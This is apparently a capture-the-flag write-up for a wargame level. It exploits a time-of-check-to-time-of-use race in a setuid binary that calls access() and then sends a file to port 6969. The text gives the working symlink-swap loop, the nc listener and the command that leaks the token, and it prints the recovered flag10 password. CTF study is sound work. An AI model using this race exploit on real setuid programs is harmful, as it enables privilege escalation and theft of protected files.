we have 2 files level10 wich is an executable file and token

by uncompile level10 we can see the program is taking  2 arguments
wich are a file and a host.
the program check with access if you can read the file
and if it's possible it will send the file to the host at port 6969

int the man of access we can see a warning that the function is not secure:
 Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) cre‐
       ates a security hole, because the user might exploit the short time interval between checking and opening the file to  manipulate
       it.

we can exploit this by creating in /tmp a file with access rights to read it
and then we create a script that will create a symlink from /tmp/faketoken to
/tmp/file and overwrite the symlink with the /level10/token file in a loop

listen to the port 6969 with nc -l 6969
$(while true; do ln -sf /tmp/file /tmp/faketoken; ln -sf token /tmp/faketoken; done)
./level10 /tmp/faketoken 127.0.0.1

so access will search for the rights of /tmp/faketoken->/tmp/file
access answer OK because we have the rights to read /tmp/faketoken
the loop is still running and the symlink is overwritten with the token file
and then the program open the file /tmp/faketoken->/level10/token with the uid of owner
and send it to localhost:6969

this is call a race condition

we get the password for flag10 : woupa2yuojeeaaed06riuj63c
then we connect with flag10 and get the flag
